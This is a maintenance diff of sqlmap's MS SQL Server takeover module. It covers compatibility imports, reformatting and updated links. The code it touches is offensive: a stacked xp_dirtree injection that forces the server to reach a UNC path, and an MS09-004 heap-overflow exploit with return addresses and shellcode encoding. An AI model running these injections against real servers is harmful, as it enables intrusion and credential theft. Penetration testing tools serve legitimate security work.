@@ -1,13 +1,15 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
+Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)
 See the file 'LICENSE' for copying permission
 """
 
 import binascii
 
 from lib.core.common import Backend
+from lib.core.compat import xrange
+from lib.core.convert import getBytes
 from lib.core.data import logger
 from lib.core.exception import SqlmapUnsupportedFeatureException
 from lib.request import inject
@@ -20,32 +22,33 @@ class Takeover(GenericTakeover):
         GenericTakeover.__init__(self)
 
     def uncPathRequest(self):
-        #inject.goStacked("EXEC master..xp_fileexist '%s'" % self.uncPath, silent=True)
+        # inject.goStacked("EXEC master..xp_fileexist '%s'" % self.uncPath, silent=True)
         inject.goStacked("EXEC master..xp_dirtree '%s'" % self.uncPath)
 
     def spHeapOverflow(self):
         """
         References:
-        * http://www.microsoft.com/technet/security/bulletin/MS09-004.mspx
-        * http://support.microsoft.com/kb/959420
+        * https://docs.microsoft.com/en-us/security-updates/securitybulletins/2009/ms09-004
+        * https://support.microsoft.com/en-us/help/959420/ms09-004-vulnerabilities-in-microsoft-sql-server-could-allow-remote-co
         """
 
         returns = {
-                    # 2003 Service Pack 0
-                    "2003-0": (""),
+            # 2003 Service Pack 0
+            "2003-0": (""),
 
-                    # 2003 Service Pack 1
-                    "2003-1": ("CHAR(0xab)+CHAR(0x2e)+CHAR(0xe6)+CHAR(0x7c)", "CHAR(0xee)+CHAR(0x60)+CHAR(0xa8)+CHAR(0x7c)", "CHAR(0xb5)+CHAR(0x60)+CHAR(0xa8)+CHAR(0x7c)", "CHAR(0x03)+CHAR(0x1d)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x03)+CHAR(0x1d)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x13)+CHAR(0xe4)+CHAR(0x83)+CHAR(0x7c)", "CHAR(0x1e)+CHAR(0x1d)+CHAR(0x88)+CHAR(0x7c)", "CHAR(0x1e)+CHAR(0x1d)+CHAR(0x88)+CHAR(0x7c)" ),
+            # 2003 Service Pack 1
+            "2003-1": ("CHAR(0xab)+CHAR(0x2e)+CHAR(0xe6)+CHAR(0x7c)", "CHAR(0xee)+CHAR(0x60)+CHAR(0xa8)+CHAR(0x7c)", "CHAR(0xb5)+CHAR(0x60)+CHAR(0xa8)+CHAR(0x7c)", "CHAR(0x03)+CHAR(0x1d)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x03)+CHAR(0x1d)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x13)+CHAR(0xe4)+CHAR(0x83)+CHAR(0x7c)", "CHAR(0x1e)+CHAR(0x1d)+CHAR(0x88)+CHAR(0x7c)", "CHAR(0x1e)+CHAR(0x1d)+CHAR(0x88)+CHAR(0x7c)"),
 
-                    # 2003 Service Pack 2 updated at 12/2008
-                    #"2003-2": ("CHAR(0xe4)+CHAR(0x37)+CHAR(0xea)+CHAR(0x7c)", "CHAR(0x15)+CHAR(0xc9)+CHAR(0x93)+CHAR(0x7c)", "CHAR(0x96)+CHAR(0xdc)+CHAR(0xa7)+CHAR(0x7c)", "CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x17)+CHAR(0xf5)+CHAR(0x83)+CHAR(0x7c)", "CHAR(0x1b)+CHAR(0xa0)+CHAR(0x86)+CHAR(0x7c)", "CHAR(0x1b)+CHAR(0xa0)+CHAR(0x86)+CHAR(0x7c)" ),
+            # 2003 Service Pack 2 updated at 12/2008
+            # "2003-2": ("CHAR(0xe4)+CHAR(0x37)+CHAR(0xea)+CHAR(0x7c)", "CHAR(0x15)+CHAR(0xc9)+CHAR(0x93)+CHAR(0x7c)", "CHAR(0x96)+CHAR(0xdc)+CHAR(0xa7)+CHAR(0x7c)", "CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x17)+CHAR(0xf5)+CHAR(0x83)+CHAR(0x7c)", "CHAR(0x1b)+CHAR(0xa0)+CHAR(0x86)+CHAR(0x7c)", "CHAR(0x1b)+CHAR(0xa0)+CHAR(0x86)+CHAR(0x7c)"),
 
-                    # 2003 Service Pack 2 updated at 05/2009
-                    "2003-2": ("CHAR(0xc3)+CHAR(0xdb)+CHAR(0x67)+CHAR(0x77)", "CHAR(0x15)+CHAR(0xc9)+CHAR(0x93)+CHAR(0x7c)", "CHAR(0x96)+CHAR(0xdc)+CHAR(0xa7)+CHAR(0x7c)", "CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x47)+CHAR(0xf5)+CHAR(0x83)+CHAR(0x7c)", "CHAR(0x0f)+CHAR(0x31)+CHAR(0x8e)+CHAR(0x7c)", "CHAR(0x0f)+CHAR(0x31)+CHAR(0x8e)+CHAR(0x7c)"),
+            # 2003 Service Pack 2 updated at 05/2009
+            "2003-2": ("CHAR(0xc3)+CHAR(0xdb)+CHAR(0x67)+CHAR(0x77)", "CHAR(0x15)+CHAR(0xc9)+CHAR(0x93)+CHAR(0x7c)", "CHAR(0x96)+CHAR(0xdc)+CHAR(0xa7)+CHAR(0x7c)", "CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x47)+CHAR(0xf5)+CHAR(0x83)+CHAR(0x7c)", "CHAR(0x0f)+CHAR(0x31)+CHAR(0x8e)+CHAR(0x7c)", "CHAR(0x0f)+CHAR(0x31)+CHAR(0x8e)+CHAR(0x7c)"),
 
-                    # 2003 Service Pack 2 updated at 09/2009
-                    #"2003-2": ("CHAR(0xc3)+CHAR(0xc2)+CHAR(0xed)+CHAR(0x7c)", "CHAR(0xf3)+CHAR(0xd9)+CHAR(0xa7)+CHAR(0x7c)", "CHAR(0x99)+CHAR(0xc8)+CHAR(0x93)+CHAR(0x7c)", "CHAR(0x63)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x63)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x17)+CHAR(0xf5)+CHAR(0x83)+CHAR(0x7c)", "CHAR(0xa4)+CHAR(0xde)+CHAR(0x8e)+CHAR(0x7c)", "CHAR(0xa4)+CHAR(0xde)+CHAR(0x8e)+CHAR(0x7c)"),
-                  }
+            # 2003 Service Pack 2 updated at 09/2009
+            # "2003-2": ("CHAR(0xc3)+CHAR(0xc2)+CHAR(0xed)+CHAR(0x7c)", "CHAR(0xf3)+CHAR(0xd9)+CHAR(0xa7)+CHAR(0x7c)", "CHAR(0x99)+CHAR(0xc8)+CHAR(0x93)+CHAR(0x7c)", "CHAR(0x63)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x63)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x17)+CHAR(0xf5)+CHAR(0x83)+CHAR(0x7c)", "CHAR(0xa4)+CHAR(0xde)+CHAR(0x8e)+CHAR(0x7c)", "CHAR(0xa4)+CHAR(0xde)+CHAR(0x8e)+CHAR(0x7c)"),
+        }
+
         addrs = None
 
         for versionSp, data in returns.items():
@@ -65,7 +68,7 @@ class Takeover(GenericTakeover):
             raise SqlmapUnsupportedFeatureException(errMsg)
 
         shellcodeChar = ""
-        hexStr = binascii.hexlify(self.shellcodeString[:-1])
+        hexStr = binascii.hexlify(getBytes(self.shellcodeString[:-1]))
 
         for hexPair in xrange(0, len(hexStr), 2):
             shellcodeChar += "CHAR(0x%s)+" % hexStr[hexPair:hexPair + 2]
